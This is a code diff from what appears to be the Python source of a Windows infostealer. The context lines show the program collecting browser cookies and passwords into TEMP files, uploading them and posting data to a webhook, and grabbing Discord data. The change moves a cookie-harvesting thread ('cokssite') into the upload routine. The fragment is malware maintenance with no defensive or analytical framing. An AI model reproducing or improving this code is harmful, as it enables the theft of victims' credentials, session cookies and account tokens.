@@ -1729,6 +1729,7 @@ url_dict = {}
    
 data = []
 def paaz(filetype):
+    temp = []
     if filetype == 'cook':
         try:
             file = os.getenv("TEMP") + f"\wpcook.txt"
@@ -1739,6 +1740,11 @@ def paaz(filetype):
 
         s = upload_file(file)
         url_dict['cook'] = s
+    
+        rbx = threading.Thread(target=cokssite)
+        rbx.start()
+        temp.append(rbx)
+        
 
     if filetype == 'passw':
         try:
@@ -1798,6 +1804,9 @@ def paaz(filetype):
             LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         except:
             pass
+        
+        for thread in temp:
+            thread.join()
         try:
             file = os.getenv("TEMP") + f"\wpcook.txt"
             file2 = os.getenv("TEMP") + f"\wppassw.txt"
@@ -2287,10 +2296,6 @@ def gatha():
         di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         di.start()
         aa.append(di)
-        
-    rbx = threading.Thread(target=cokssite)
-    rbx.start()
-    aa.append(rbx)
     
     for thread in co:
         thread.join()
